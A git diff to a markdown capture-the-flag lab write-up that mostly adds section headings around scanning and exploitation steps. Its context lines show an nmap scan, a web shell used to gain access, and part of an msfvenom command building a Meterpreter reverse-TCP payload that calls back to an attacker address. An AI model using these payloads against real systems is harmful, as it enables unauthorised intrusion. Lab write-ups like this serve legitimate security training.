@@ -10,6 +10,8 @@ draft: false
 
 # Scanning
 
+## Rustscan
+
 - Ports Scan using rustscan
 
 ![Pasted image 20250516011901.png](images/Pasted_image_20250516011901.png)
@@ -27,7 +29,7 @@ open 10.10.10.5:21
 open 10.10.10.5:80                                                                            
 ```
 
-- Full Nmap Scan
+## Nmap
 
 ```bash
 nmap -sC -sV -T5 -A -p21,80 -oA nmap/initials 10.10.10.5
@@ -105,6 +107,8 @@ https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Disc
 - Successfully confirmed access via basic web shell.
 - For improved post-exploitation capabilities, generated a Meterpreter shell using:
 
+## Metasploit Stuff
+
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp \
   LHOST=10.10.16.10 LPORT=1337 \
@@ -121,6 +125,8 @@ msfvenom -p windows/meterpreter/reverse_tcp \
 ![Pasted image 20250516015617.png](images/Pasted_image_20250516015617.png)
 
 # Post Exploitation
+
+## Again Metasploit Stuff
 
 - Used the exploit suggester module to identify potential privilege escalation vectors:
 
